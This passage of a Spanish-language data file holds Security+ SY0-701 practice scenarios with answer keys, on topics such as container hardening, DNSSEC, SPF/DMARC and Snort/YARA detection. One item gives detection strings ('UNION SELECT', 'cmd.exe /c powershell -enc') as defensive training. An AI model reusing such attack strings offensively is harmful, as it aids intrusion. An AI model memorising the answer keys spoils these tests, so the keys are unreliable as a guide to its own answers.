      'Fase 1 - Preparación: Actualizar playbooks de respuesta, capacitar analistas y verificar copias de seguridad desconectadas (Air-Gap).',
      'Fase 2 - Detección y Análisis: Correlacionar alertas en el SIEM, analizar hashes de malware y determinar el alcance y vectores del ataque.',
      'Fase 3 - Contención: Aislar de inmediato el equipo infectado de la red (quarantine VLAN / deshabilitar puerto switch) para evitar propagación.',
      'Fase 4 - Erradicación: Eliminar binarios maliciosos, tareas programadas persistentes y formatear/reinstalar sistemas comprometidos.',
      'Fase 5 - Recuperación: Restaurar datos desde copias de seguridad limpias verificadas, reconectar sistemas y realizar monitoreo reforzado.',
      'Fase 6 - Lecciones Aprendidas: Redactar el informe post-incidente, identificar brechas en los controles y actualizar directivas.'
    ],
    tacticalTip:
      'CyberKraft Tip: El orden estricto de NIST SP 800-61r2 que DEBES memorizar para Security+ es: 1. Preparation -> 2. Detection & Analysis -> 3. Containment -> 4. Eradication -> 5. Recovery -> 6. Lessons Learned (Post-Incident). Nunca saltes a la Erradicación sin antes Contener.'
  },

  // PBQ 18: Container & Pod Security
  {
    id: 'pbq-18',
    number: 18,
    category: 'container-security',
    categoryTitle: 'Seguridad en Contenedores y Kubernetes',
    title: 'Endurecimiento de Contenedores Docker y Pods de Kubernetes',
    estimatedMinutes: 4,
    domain: 'Dominio 3: Arquitectura de Seguridad',
    sy0701Objective: 'Objetivo 3.1: Comparar y contrastar las implicaciones de seguridad de distintos modelos de arquitectura. (relacionado: 2.5)',
    scenario:
      'El equipo de DevOps desplegó un microservicio en un clúster de Kubernetes usando imágenes con privilegios de root y sin directivas de red, permitiendo que un atacante intente un escape de contenedor (Container Breakout). Aplica los controles del CIS Kubernetes Benchmark para endurecer la especificación del pod.',
    requirements: [
      'Sustituye la imagen base voluminosa por una imagen minimalista Distroless sin shell ni gestores de paquetes.',
      'Configura SecurityContext para forzar la ejecución con un usuario no-root (UID 10001).',
      'Inyecta secretos mediante HashiCorp Vault / KMS CSI Driver en lugar de variables de entorno en texto plano.',
      'Aplica una política de red (NetworkPolicy) de Denegación por Defecto (Default-Deny) para aislar el pod en la red.',
      'Monta el sistema de archivos raíz como Solo Lectura (readOnlyRootFilesystem: true).'
    ],
    tacticalTip:
      'CyberKraft Tip: En seguridad de contenedores de SY0-701: 1. Distroless reduce la superficie de ataque; 2. Run as non-root previene elevación a root del nodo físico; 3. readOnlyRootFilesystem evita que el malware escriba herramientas en disco; 4. Default-deny network policies contienen el movimiento lateral.'
  },

  // PBQ 19: Physical Security & Datacenter Design
  {
    id: 'pbq-19',
    number: 19,
    category: 'physical-security',
    categoryTitle: 'Seguridad Física y Ambiental de Instalaciones',
    title: 'Diseño de Seguridad Física y Protección de Centro de Datos',
    estimatedMinutes: 4,
    domain: 'Dominio 1: Conceptos Generales de Seguridad',
    sy0701Objective: 'Objetivo 1.2: Resumir conceptos fundamentales de seguridad.',
    scenario:
      'Estás a cargo de certificar la seguridad física de un nuevo centro de datos corporativo de alta criticidad (Tier III). Debes seleccionar las defensas físicas en capas para detener ataques vehiculares, prevenir accesos no autorizados a la sala de servidores (tailgating), extinguir incendios sin arruinar el hardware y mitigar espionaje por señales electromagnéticas.',
    requirements: [
      'Barrera Perimetral: Instala bolardos de acero con certificación anti-impacto (Crash-rated K12) para detener embestidas vehiculares.',
      'Control de Acceso a Racks: Implementa un Mantrap (esclusa de seguridad de dos puertas) con biometría de doble factor y sensor de peso para erradicar el Tailgating.',
      'Supresión de Incendios: Selecciona un sistema de gas limpio no conductor (FM-200 o Novec 1230) en lugar de rociadores de agua.',
      'Gestión Térmica: Aplica confinamiento de Pasillos Fríos y Pasillos Calientes (Hot/Cold Aisle) para evitar sobrecalentamiento.',
      'Apantallamiento TEMPEST: Instala una Jaula de Faraday blindada y conectada a tierra para bloquear emanaciones de radiofrecuencia.'
    ],
    tacticalTip:
      'CyberKraft Tip: En preguntas de seguridad física de CompTIA: Rociadores de agua jamás van en salas de cómputo en funcionamiento (usa gas limpio FM-200/Novec); el Mantrap (Access Control Vestibule) con peso es la respuesta infalible contra Tailgating/Piggybacking; los bolardos K12 detienen camiones.'
  },

  // PBQ 20: Disaster Recovery & Continuity
  {
    id: 'pbq-20',
    number: 20,
    category: 'disaster-recovery',
    categoryTitle: 'Continuidad de Negocio y Recuperación (DRP)',
    title: 'Continuidad de Negocio, Cálculo de RTO/RPO y Resiliencia',
    estimatedMinutes: 5,
    domain: 'Dominio 3: Arquitectura de Seguridad',
    sy0701Objective: 'Objetivo 3.4: Explicar la importancia de la resiliencia y la recuperación en la arquitectura de seguridad. (relacionado: 5.2)',
    scenario:
      'Un banco comercial en línea requiere actualizar su Plan de Recuperación ante Desastres (DRP) para cumplir un Acuerdo de Nivel de Servicio (SLA) de 99.99% de disponibilidad. Debes definir las métricas clave de tiempo y pérdida de datos tolerables (RTO y RPO), seleccionar el tipo de sitio alternativo de contingencia y configurar la arquitectura de respaldos inmutables.',
    requirements: [
      'Establece el Recovery Time Objective (RTO) en menos de 2 horas para cumplir la meta de disponibilidad anual.',
      'Fija el Recovery Point Objective (RPO) en máximo 15 minutos mediante replicación síncrona continua de base de datos.',
      'Elige un Hot Site (sitio espejo activo) con hardware idéntico y conmutación automática por error (failover).',
      'Aplica la regla de copias de seguridad 3-2-1: 3 copias de datos en 2 medios distintos con 1 copia fuera de sitio (Offsite).',
      'Activa almacenamiento inmutable WORM (Write Once, Read Many) y bloqueo de retención para que el ransomware no pueda destruir las copias.'
    ],
    tacticalTip:
      'CyberKraft Tip: Diferencia fundamental de examen: RTO (Recovery Time Objective) es el tiempo MÁXIMO que el sistema puede estar caído. RPO (Recovery Point Objective) es la cantidad MÁXIMA de datos perdidos medida en tiempo. Hot Site = minutos/inmediato; Warm Site = horas; Cold Site = días.'
  },

  // PBQ 21: Social Engineering & Human Factors
  {
    id: 'pbq-21',
    number: 21,
    category: 'social-engineering',
    categoryTitle: 'Ingeniería Social y Factores Humanos',
    title: 'Identificación de Vectores de Ingeniería Social y Factores Humanos',
    estimatedMinutes: 4,
    domain: 'Dominio 2: Amenazas, Vulnerabilidades y Mitigaciones',
    sy0701Objective: 'Objetivo 2.2: Explicar vectores de amenaza y superficies de ataque comunes. (relacionado: 5.6)',
    scenario:
      'El departamento de Recursos Humanos y el SOC recibieron reportes de 4 incidentes sospechosos ocurridos durante la misma semana. Analiza las evidencias de cada incidente y clasifica: el vector de ataque técnico, el principio psicológico de influencia (Robert Cialdini) utilizado por el atacante y la contramedida de seguridad recomendada.',
    requirements: [
      'Caso 1 (SMS urgente de cargo no reconocido en tarjeta): Clasifica como Smishing, principio de Urgencia y educación en concienciación.',
      'Caso 2 (Llamada telefónica suplantando al CEO pidiendo gift cards urgentes): Clasifica como Vishing, principio de Autoridad e intimidación, y validación fuera de banda.',
      'Caso 3 (Correo a Finanzas pidiendo cambio de cuenta bancaria de proveedor de confianza): Clasifica como Whaling / BEC, principio de Confianza/Consenso y procedimiento de doble autorización.',
      'Caso 4 (Memorias USB dejadas en el estacionamiento con etiqueta "Bonos"): Clasifica como Baiting, principio de Curiosidad/Escasez y desactivación de AutoRun con bloqueo de USB.'
    ],
    tacticalTip:
      'CyberKraft Tip: Asocia los canales con sus términos: SMS -> Smishing; Voz/Teléfono -> Vishing; Correos a altos cargos -> Whaling / BEC; Obsequios físicos/USBs en el suelo -> Baiting. Los principios de Cialdini en SY0-701: Autoridad (intimidación por cargo), Urgencia (tiempo límite falso), Curiosidad/Escasez (ofertas/secretos).'
  },

  // PBQ 22: Digital Forensics & Order of Volatility
  {
    id: 'pbq-22',
    number: 22,
    category: 'digital-forensics',
    categoryTitle: 'Forense Digital y Cadena de Custodia',
    title: 'Orden Forense de Volatilidad (RFC 3227) y Verificación de Integridad',
    estimatedMinutes: 5,
    domain: 'Dominio 4: Operaciones de Seguridad',
    sy0701Objective: 'Objetivo 4.8: Explicar las actividades apropiadas de respuesta a incidentes.',
    scenario:
      'Un servidor de transferencias bancarias ha sido comprometido mediante una inyección de memoria activa. Como perito informático forense asignado, debes recolectar las evidencias digitales asegurando la validez legal ante un tribunal. Ordena los 6 tipos de evidencia desde la más volátil (que se destruiría inmediatamente si el equipo se desconecta) hasta la menos volátil según el estándar RFC 3227, y activa los controles de integridad criptográfica y no repudio.',
    requirements: [
      'Ordena secuencialmente los 6 elementos del Orden de Volatilidad RFC 3227: Registros CPU/Caché -> Memoria RAM -> Espacio Swap / Archivo de paginación -> Disco duro / Almacenamiento local -> Registros remotos / SIEM -> Cintas de respaldo de archivo.',
      'Activa el uso obligatorio del Bloqueador de Escritura Físico (Hardware Write Blocker) antes de clonar el disco.',
      'Selecciona el algoritmo de hash criptográfico seguro (SHA-256) para certificar la integridad de la imagen bit a bit.',
      'Firma y completa formalmente el Registro de Cadena de Custodia para asegurar la admisibilidad jurídica.'
    ],
    tacticalTip:
      'CyberKraft Tip: El Orden de Volatilidad RFC 3227 es una de las preguntas fijas en CompTIA Security+: 1. Registros CPU/Caché -> 2. RAM (conexiones y procesos activos) -> 3. Swap/Pagefile -> 4. Disco duro local -> 5. Logs remotos -> 6. Cintas/Medios ópticos. Un Write-Blocker es obligatorio para no modificar atime/mtime.'
  },

  // PBQ 23: Quantitative Risk Assessment
  {
    id: 'pbq-23',
    number: 23,
    category: 'risk-management',
    categoryTitle: 'Gestión y Evaluación de Riesgos',
    title: 'Análisis Cuantitativo de Riesgo (Fórmulas SLE, ARO, ALE) y Tratamiento',
    estimatedMinutes: 5,
    domain: 'Dominio 5: Gestión y Supervisión del Programa de Seguridad',
    sy0701Objective: 'Objetivo 5.2: Explicar los elementos del proceso de gestión de riesgos.',
    scenario:
      'La gerencia de riesgos requiere cuantificar el impacto financiero potencial de incidentes en el servidor transaccional. El panel muestra el valor del activo (AV), el factor de exposición (EF) y la frecuencia de ocurrencia; los valores cambian en cada intento. Calcula SLE y ALE, y asigna la estrategia de tratamiento de riesgo adecuada a 4 amenazas específicas de la empresa.',
    requirements: [
      'Calcula el SLE (Single Loss Expectancy) del incidente.',
      'Calcula el ALE (Annualized Loss Expectancy) a partir del SLE y la frecuencia anual.',
      'Asigna a cada una de las 4 amenazas la estrategia de tratamiento más adecuada: Mitigar, Transferir, Aceptar o Evitar.'
    ],
    tacticalTip:
      'CyberKraft Tip: Memoriza las fórmulas doradas: SLE = AV × EF; ALE = SLE × ARO. Si el costo del control anual es menor que el ALE, se Mitiga. Si el riesgo se cubre con póliza, se Transfiere. Si el costo de mitigar supera el daño, se Acepta formalmente. Si el servicio se cancela por riesgoso, se Evita.'
  },

  // PBQ 24: Email Security SPF, DKIM, DMARC
  {
    id: 'pbq-24',
    number: 24,
    category: 'email-security',
    categoryTitle: 'Autenticación y Seguridad de Correo',
    title: 'Defensa de Correo Electrónico: Registros DNS SPF, DKIM y DMARC',
    estimatedMinutes: 4,
    domain: 'Dominio 4: Operaciones de Seguridad',
    sy0701Objective: 'Objetivo 4.5: Dado un escenario, modificar las capacidades empresariales para mejorar la seguridad.',
    scenario:
      'Un atacante está enviando correos fraudulentos a clientes usando la dirección ceo@corp.com para solicitar transferencias financieras (Ataque BEC / Spoofing). Como arquitecto de seguridad, debes configurar los registros DNS públicos de autenticación de correo del dominio para que los servidores destinatarios del mundo rechacen y reporten cualquier correo falsificado.',
    requirements: [
      'Configura el registro SPF con el calificador estricto HardFail (-all) para que servidores de terceros no autorizados sean denegados de inmediato.',
      'Establece el tamaño de clave pública asimétrica RSA para DKIM en 2048 bits para prevenir factorización de firmas.',
      'Aplica la directiva DMARC estricta p=reject en lugar de p=none o p=quarantine.',
      'Configura el parámetro rua=mailto:dmarc-reports@corp.com con porcentaje pct=100 para recibir informes forenses XML de todos los envíos falsificados.'
    ],
    tacticalTip:
      'CyberKraft Tip: SPF valida la IP de origen (-all = Hard Fail estricto; ~all = Soft Fail flexible); DKIM valida la integridad del contenido mediante firma asimétrica de cabeceras; DMARC vincula ambos e instruye la acción (p=reject es la máxima protección contra BEC y Phishing).'
  },

  // PBQ 25: Security CLI & Terminal Diagnostics
  {
    id: 'pbq-25',
    number: 25,
    category: 'security-cli',
    categoryTitle: 'Herramientas y Diagnóstico por Consola CLI',
    title: 'Diagnóstico Táctico de Amenazas por Comandos de Consola (Linux / Windows)',
    estimatedMinutes: 5,
    domain: 'Dominio 4: Operaciones de Seguridad',
    sy0701Objective: 'Objetivo 4.9: Dado un escenario, usar fuentes de datos para apoyar una investigación. (relacionado: 4.4)',
    scenario:
      'Durante una guardia en el SOC, se detecta telemetría anómala en un servidor crítico de producción. Debes interactuar con la consola de comandos de terminal para auditar puertos abiertos y PIDs, capturar tráfico de red en vivo, calcular hashes de integridad de binarios del sistema para detectar troyanos y asegurar permisos octales de archivos sensibles.',
    requirements: [
      'Identificar puertos a la escucha y PIDs asociados en Linux: selecciona "netstat -tulpn" (o ss -tulpn).',
      'Capturar paquetes en vivo sin resolución de nombres en la interfaz eth0: selecciona "tcpdump -i eth0 -nn -s0".',
      'Verificar si un binario del sistema fue modificado por un rootkit: selecciona "sha256sum /bin/login".',
      'Restringir permisos de acceso al archivo crítico de hashes de usuarios: selecciona "chmod 600 /etc/shadow && chown root:root /etc/shadow".'
    ],
    tacticalTip:
      'CyberKraft Tip: CompTIA siempre evalúa flags de comandos: netstat -t (TCP), -u (UDP), -l (Listening), -p (PID/Program), -n (Numeric IPs). tcpdump -nn (evita resolver DNS y nombres de puertos para no perder paquetes). chmod 600 = solo el propietario root puede leer y escribir.'
  },

  // PBQ 26: IDS/IPS Snort & YARA Rule Engineering
  {
    id: 'pbq-26',
    number: 26,
    category: 'ids-yara-rules',
    categoryTitle: 'IDS/IPS Snort y Reglas YARA',
    title: 'Ingeniería de Detección: Reglas NIPS Snort y Reglas YARA para Malware',
    estimatedMinutes: 5,
    domain: 'Dominio 4: Operaciones de Seguridad',
    sy0701Objective: 'Objetivo 4.5: Dado un escenario, modificar las capacidades empresariales para mejorar la seguridad. (relacionado: 4.4)',
    scenario:
      'Los sensores NIPS del perímetro y los agentes EDR del endpoint requieren nuevas firmas de detección ante una campaña activa de robo de credenciales y explotación SQL. Como analista de detección e ingeniería del SOC, debes construir una regla de Snort para descartar (drop) en línea peticiones HTTP con inyecciones SQL ciegas ("UNION SELECT") y configurar los parámetros de una regla YARA que identifique binarios ejecutables Windows PE maliciosos invocando PowerShell codificado.',
    requirements: [
      'Establece la acción del sensor Snort en "drop" para bloqueo activo en línea en el NIPS.',
      'Aplica el patrón de contenido malicioso "UNION SELECT" con el modificador "nocase" para evitar evasión con mayúsculas/minúsculas alternas.',
      'Configura la condición mágica del encabezado binario en YARA con "0x5A4D" (firma MZ de ejecutables Windows PE).',
      'Asigna la cadena sospechosa "cmd.exe /c powershell -enc" en la sección de strings de la regla YARA.'
    ],
    tacticalTip:
      'CyberKraft Tip: Snort tiene acciones alert (solo avisa), log (guarda) y drop (bloquea activamente en línea). El modificador "nocase" es fundamental contra atacantes que mezclan UniOn SeLeCt. En YARA, todo binario Windows comienza con los bytes 0x5A4D ("MZ" en ASCII de Mark Zbikowski).'
  },

  // PBQ 27: DevSecOps CI/CD Pipeline
  {
    id: 'pbq-27',
    number: 27,
    category: 'devsecops-pipeline',
    categoryTitle: 'DevSecOps y Ciclo de Vida Seguro (SDLC)',
    title: 'Integración Shift-Left de Seguridad en el Pipeline CI/CD',
    estimatedMinutes: 4,
    domain: 'Dominio 4: Operaciones de Seguridad',
    sy0701Objective: 'Objetivo 4.1: Dado un escenario, aplicar técnicas de seguridad comunes a los recursos informáticos. (relacionado: 3.1)',
    scenario:
      'La organización ha adoptado una cultura DevSecOps y necesita implementar el principio "Shift-Left", detectando debilidades de seguridad lo más temprano posible en el pipeline de entrega continua. Posiciona la herramienta y control de seguridad óptimo en cada una de las 4 fases del pipeline: Commit de código, Compilación (Build), Pruebas (Test/Staging) y Despliegue a Producción (Deploy).',
    requirements: [
      'Fase Commit (Local del desarrollador): Pre-commit hook & Secret Scanning (TruffleHog / GitGuardian) para evitar subir tokens/claves a Git.',
      'Fase Build (Compilación e integración): SAST (SonarQube) y análisis de dependencias SCA / SBOM (Snyk/Dependabot).',
      'Fase Test (Entorno de pruebas/Staging): DAST (OWASP ZAP) simulando ataques en tiempo de ejecución.',
      'Fase Deploy (Lanzamiento a producción): Verificación de firma criptográfica de contenedores (Cosign) y agente RASP.'
    ],
    tacticalTip:
      'CyberKraft Tip: Shift-Left significa mover las pruebas hacia la izquierda en la línea de tiempo. SAST analiza código estático sin ejecutarlo (fase Build); DAST analiza la aplicación viva desde el exterior como atacante (fase Test); Secret Scanning intercepta credenciales antes de ser empujadas al repositorio.'
  },

  // PBQ 28: Cryptographic Attacks & Countermeasures
  {
    id: 'pbq-28',
    number: 28,
    category: 'crypto-attacks',
    categoryTitle: 'Ataques Criptográficos y Criptoanálisis',
    title: 'Identificación de Ataques Criptográficos y Selección de Contramedidas',
    estimatedMinutes: 5,
    domain: 'Dominio 2: Amenazas, Vulnerabilidades y Mitigaciones',
    sy0701Objective: 'Objetivo 2.4: Dado un escenario, analizar indicadores de actividad maliciosa. (relacionado: 1.4)',
    scenario:
      'El equipo de seguridad ha recibido cuatro reportes de incidentes criptográficos en diversos sistemas. Analiza los síntomas descritos en cada caso, clasifica la técnica exacta de ataque criptográfico empleada (Rainbow Tables, Birthday Attack / Hash Collision, Replay Attack, Downgrade Attack) y selecciona la contramedida criptográfica matemática adecuada.',
    requirements: [
      'Caso 1 (Hashes de contraseñas rotos en segundos contra base de datos de hashes precomputados): Clasifica como Rainbow Tables y mitiga con Salting criptográfico aleatorio y Key Stretching (Argon2 / bcrypt).',
      'Caso 2 (Atacante falsifica certificado SSL generando un archivo malicioso con el mismo digest SHA-1): Clasifica como Birthday Attack / Hash Collision y mitiga migrando a SHA-256.',
      'Caso 3 (Atacante captura paquete de autenticación válido y lo retransmite para ganar acceso): Clasifica como Replay Attack y mitiga con Nonces únicos de sesión y Timestamps con expiración.',
      'Caso 4 (Atacante interrumpe negociación TLS forzando al cliente a usar SSLv3 vulnerable): Clasifica como Downgrade Attack y mitiga exigiendo encabezado HSTS y deshabilitando suites legadas.'
    ],
    tacticalTip:
      'CyberKraft Tip: Rainbow Tables = hashes precalculados (solución: Salting). Paradoja del cumpleaños = encontrar dos entradas distintas que arrojen el mismo hash (solución: función hash con mayor espacio de estados como SHA-256). Replay = reenviar tráfico válido (solución: Nonces, Timestamps). Downgrade = forzar versión obsoleta como POODLE (solución: HSTS).'
  },

  // PBQ 29: Federated Identity, SSO & Tokens
  {
    id: 'pbq-29',
    number: 29,
    category: 'identity-federation',
    categoryTitle: 'Federación de Identidades y Single Sign-On',
    title: 'Arquitectura de Autenticación Federada, Tokens y Single Sign-On (SSO)',
    estimatedMinutes: 4,
    domain: 'Dominio 4: Operaciones de Seguridad',
    sy0701Objective: 'Objetivo 4.6: Dado un escenario, implementar y mantener la gestión de identidades y accesos.',
    scenario:
      'La empresa está migrando su infraestructura a un modelo multi-nube híbrido y requiere estandarizar el acceso corporativo sin que los usuarios tengan que recordar múltiples contraseñas. Diseña la arquitectura de identidad seleccionando el protocolo exacto para SSO corporativo web, delegación de permisos en APIs, autenticación en apps móviles y aprovisionamiento automático de cuentas.',
    requirements: [
      'Single Sign-On Web Corporativo entre IdP corporativo y aplicaciones SaaS (Salesforce/Workday): SAML 2.0 (XML Assertions).',
      'Autorización y delegación de acceso granular a APIs de terceros sin compartir credenciales: OAuth 2.0 (Access Tokens Bearer).',
      'Capa de autenticación e identidad moderna para apps móviles y SPAs con tokens firmados: OpenID Connect / OIDC (JWT ID Tokens).',
      'Aprovisionamiento y desaprovisionamiento automatizado del ciclo de vida de usuarios entre Active Directory y la nube: SCIM (System for Cross-domain Identity Management).'
    ],
    tacticalTip:
      'CyberKraft Tip: CompTIA siempre evalúa la diferencia: SAML 2.0 = SSO web empresarial con XML. OAuth 2.0 = Autorización de APIs (Access Tokens con scopes). OpenID Connect (OIDC) = Autenticación construida sobre OAuth (ID Token JWT). SCIM = Sincronización y aprovisionamiento de cuentas de usuario entre IdP y aplicaciones.'
  },

  // PBQ 30: Mobile Security & MDM/MAM Policies
  {
    id: 'pbq-30',
    number: 30,
    category: 'mobile-security',
    categoryTitle: 'Gestión y Políticas de Seguridad Móvil (MDM/MAM)',
    title: 'Consola de Directivas de Dispositivos Móviles Empresariales (MDM / MAM / BYOD)',
    estimatedMinutes: 4,
    domain: 'Dominio 4: Operaciones de Seguridad',
    sy0701Objective: 'Objetivo 4.1: Dado un escenario, aplicar técnicas de seguridad comunes a los recursos informáticos.',
    scenario:
      'El CISO ha autorizado un programa de "Trae tu propio dispositivo" (BYOD) para smartphones de empleados junto con teléfonos corporativos (COPE). Debes configurar la política oficial en la consola de Mobile Device Management (MDM) garantizando la privacidad de los empleados y protegiendo al mismo tiempo la información clasificada de la empresa.',
    requirements: [
      'Política de borrado ante pérdida de smartphone personal (BYOD): Enterprise Selective Wipe (borra solo correos y datos corporativos, preservando fotos personales).',
      'Protección de datos entre aplicaciones de negocio y personales: MAM (Mobile Application Management) con contenedorización y sandboxing cifrado.',
      'Detección de dispositivos alterados con Jailbreak (iOS) o Root (Android): Detección automática y bloqueo de acceso con cuarentena inmediata.',
      'Acceso físico a salas de servidores y laboratorios de investigación: Geofencing perimetral que deshabilite automáticamente cámaras y micrófonos del teléfono.'
    ],
    tacticalTip:
      'CyberKraft Tip: En BYOD, el borrado de fábrica (Full Device Wipe) viola la privacidad y genera demandas legales: la respuesta correcta siempre es "Enterprise Selective Wipe". MAM aísla y cifra únicamente las apps corporativas impidiendo copiar/pegar hacia apps no seguras.'
  },

  // PBQ 31: Port Security & Protocol Hardening (CompTIA Port Mastery)
  {
    id: 'pbq-31',
    number: 31,
    category: 'port-security',
    categoryTitle: 'Puertos y Protocolos Críticos (Port Mastery)',
    title: 'Auditoría de Puertos en Texto Plano y Migración Criptográfica de Red',
    estimatedMinutes: 5,
    domain: 'Dominio 4: Operaciones de Seguridad',
    sy0701Objective: 'Objetivo 4.5: Dado un escenario, modificar las capacidades empresariales para mejorar la seguridad. (relacionado: 2.5)',
    scenario:
      'Una auditoría perimetral e interna ha detectado 8 servicios activos ejecutándose en puertos y protocolos de texto plano o desprotegidos. Para cada servicio auditado, diagnostica la vulnerabilidad intrínseca, asigna el puerto seguro oficial exigido por CompTIA, selecciona el protocolo criptográfico sustituto y define la regla de remediación.',
    requirements: [
      'Telnet (Puerto 23) -> Migrar a SSH en puerto 22 con bloqueo perimetral del puerto 23.',
      'HTTP (Puerto 80) -> Migrar a HTTPS en puerto 443 con TLS 1.3 y redirección permanente 301.',
      'LDAP (Puerto 389) -> Migrar a LDAPS en puerto 636 con Channel Binding y certificados TLS mutuos.',
      'FTP (Puertos 20/21) -> Reemplazar por SFTP en puerto 22 (basado en SSH) o FTPS (989/990).',
      'SNMP (Puerto 161) -> Actualizar agentes a SNMPv3 en modo authPriv con autenticación SHA y cifrado AES.',
      'Syslog (Puerto 514 UDP) -> Configurar Syslog-over-TLS sobre TCP en puerto 6514 con certificados mutuos.',
      'RDP (Puerto 3389 expuesto a WAN) -> Bloquear acceso perimetral directo y canalizar tras VPN con MFA y NLA.',
      'DNS (Puerto 53 UDP) -> Implementar DoT en puerto 853 (o DoH en 443) con validación DNSSEC estricta.'
    ],
    tacticalTip:
      'CyberKraft Tip: Memorizar estos pares es fundamental en CompTIA: 23(Telnet)->22(SSH), 80(HTTP)->443(HTTPS), 389(LDAP)->636(LDAPS), 21(FTP)->22(SFTP)/990(FTPS), 161(SNMPv1/v2)->161(SNMPv3 authPriv), 514(Syslog UDP)->6514(Syslog TLS TCP), 53(DNS)->853(DoT).'
  },

  // PBQ 32: Nmap Port Scanning & Reconnaissance Analysis
  {
    id: 'pbq-32',
    number: 32,
    category: 'nmap-recon',
    categoryTitle: 'Reconocimiento y Escaneo de Puertos Nmap',
    title: 'Interpretación de Escaneo Nmap y Hardening Táctico de Puertos Abiertos',
    estimatedMinutes: 5,
    domain: 'Dominio 4: Operaciones de Seguridad',
    sy0701Objective: 'Objetivo 4.3: Explicar las actividades asociadas con la gestión de vulnerabilidades. (relacionado: 5.5)',
    scenario:
      'El equipo SOC ha recibido la salida de un escaneo de puertos de Nmap sobre el servidor interno 10.0.5.25. Debes identificar la técnica de escaneo stealth empleada y analizar cuatro puertos abiertos con riesgos críticos (vsftpd 2.3.4 con backdoor en puerto 21, Telnet en puerto 23, SMBv1 vulnerable a EternalBlue en puerto 445 y RDP expuesto en 3389), aplicando la remediación oficial.',
    requirements: [
      'Identificar la flag de escaneo SYN Stealth Scan (Half-open) con "-sS".',
      'Puerto 21 (vsftpd 2.3.4): Identificar backdoor malicioso CVE-2011-2523 y reemplazar por SFTP (puerto 22).',
      'Puerto 23 (Telnet): Identificar protocolo en claro sin cifrado y exigir SSH en puerto 22.',
      'Puerto 445 (SMBv1): Identificar vulnerabilidad crítica EternalBlue (MS17-010) y migrar a SMBv3 con firma y cifrado.',
      'Puerto 3389 (RDP): Identificar exposición perimetral directa y restringir tras Bastion Host / VPN con MFA y NLA.'
    ],
    tacticalTip:
      'CyberKraft Tip: El escaneo SYN Stealth (-sS) no completa el handshake TCP de 3 vías: envía SYN y si recibe SYN-ACK responde inmediatamente con RST. vsftpd 2.3.4 es la puerta trasera más famosa evaluada en CompTIA. SMBv1 causó la epidemia WannaCry y siempre debe deshabilitarse en favor de SMBv3.'
  },

  // PBQ 33: DNS Security, DoT/DoH & DNSSEC Hardening
  {
    id: 'pbq-33',
    number: 33,
    category: 'dns-security',
    categoryTitle: 'Seguridad en Servicios de Nombres DNS y DNSSEC',
    title: 'Hardening de Infraestructura DNS, Cifrado DoT y Mitigación de Ataques',
    estimatedMinutes: 4,
    domain: 'Dominio 4: Operaciones de Seguridad',
    sy0701Objective: 'Objetivo 4.5: Dado un escenario, modificar las capacidades empresariales para mejorar la seguridad. (relacionado: 3.2)',
    scenario:
      'Tras un intento de envenenamiento de caché (DNS Poisoning) y un intento de transferencia no autorizada de zona completa mediante dig axfr, debes endurecer la infraestructura DNS corporativa configurando registros DNSSEC, cifrado de transporte DoT, restricciones de zona y mitigando la recursión abierta.',
    requirements: [
      'Registro criptográfico DNSSEC: Selecciona RRSIG (Resource Record Signature) para verificar la autenticidad de los RRsets.',
      'Cifrado de consultas en la red: Selecciona DNS over TLS (DoT) sobre el puerto dedicado TCP 853.',
      'Transferencia de zona (AXFR): Restringe el puerto TCP 53 únicamente a las direcciones IP de servidores DNS secundarios autorizados.',
      'Recursión de resolución: Deshabilita la recursión abierta a Internet para evitar amplificación en ataques DDoS reflectores.'
    ],
    tacticalTip:
      'CyberKraft Tip: DNSSEC firma registros con RRSIG y claves en DNSKEY; previene DNS Cache Poisoning pero NO cifra el tráfico. Para cifrar consultas se usa DoT (puerto TCP 853) o DoH (puerto TCP 443). Las transferencias de zona usan TCP 53 (a diferencia de consultas normales que usan UDP 53) y deben restringirse con ACLs.'
  },

  // PBQ 34: Zero Trust Architecture (ZTA) & Microsegmentation (NIST SP 800-207)
  {
    id: 'pbq-34',
    number: 34,
    category: 'zero-trust',
    categoryTitle: 'Arquitectura Zero Trust y Microsegmentación',
    title: 'Implementación de Zero Trust Architecture (ZTA) según NIST SP 800-207',
    estimatedMinutes: 5,
    domain: 'Dominio 1: Conceptos Generales de Seguridad',
    sy0701Objective: 'Objetivo 1.2: Resumir conceptos fundamentales de seguridad. (relacionado: 3.2)',
    scenario:
      'La empresa abandona el modelo perimetral tradicional (castillo y foso) para adoptar Zero Trust. Configura la arquitectura alineada a NIST SP 800-207 definiendo el Policy Decision Point (PDP) / Policy Engine (PE), el Policy Enforcement Point (PEP), la microsegmentación del tráfico lateral (Este-Oeste) y la evaluación continua adaptativa.',
    requirements: [
      'Cerebro de decisión: Policy Decision Point (PDP) / Policy Engine (PE) evaluando señales de riesgo en tiempo real.',
      'Punto de aplicación física: Policy Enforcement Point (PEP) situado en el microperímetro del recurso.',
      'Movimiento lateral Este-Oeste: Microsegmentación de software aislando cargas de trabajo con mínimo privilegio.',
      'Principio fundamental ZTA: Validación continua adaptativa de contexto durante toda la sesión (Never Trust, Always Verify).'
    ],
    tacticalTip:
      'CyberKraft Tip: En NIST SP 800-207: El PDP (Policy Decision Point) decide si se otorga acceso; el PEP (Policy Enforcement Point) aplica la decisión interceptando la conexión. La Microsegmentación detiene el movimiento lateral Este-Oeste entre servidores.'
  },

  // PBQ 35: Web Server Hardening & HTTP Security Headers
  {
    id: 'pbq-35',
    number: 35,
    category: 'web-hardening',
    categoryTitle: 'Hardening de Servidores Web y Cabeceras HTTP',
    title: 'Blindaje de Aplicaciones Web: Cabeceras de Seguridad y TLS 1.3',
    estimatedMinutes: 4,
    domain: 'Dominio 4: Operaciones de Seguridad',
    sy0701Objective: 'Objetivo 4.1: Dado un escenario, aplicar técnicas de seguridad comunes a los recursos informáticos. (relacionado: 2.5)',
    scenario:
      'Un escaneo DAST detectó vulnerabilidades en el portal web corporativo: ausencia de forzado HTTPS, riesgo de inyección de scripts (XSS), susceptibilidad a Clickjacking (UI Redressing) y protocolos TLS obsoletos. Aplica las cabeceras de seguridad HTTP oficiales y asegura la configuración criptográfica del servidor web.',
    requirements: [
      'Prevención de degradación SSL/TLS: Strict-Transport-Security con max-age=31536000, includeSubDomains y preload.',
      'Mitigación contra Cross-Site Scripting (XSS): Content-Security-Policy restringiendo default-src a "self" y scripts con nonces.',
      'Mitigación contra Clickjacking / UI Redressing: X-Frame-Options: DENY (o CSP frame-ancestors "none").',
      'Configuración criptográfica de red: Configurar exclusivamente TLS 1.3 con intercambio de claves ECDHE (Perfect Forward Secrecy).'
    ],
    tacticalTip:
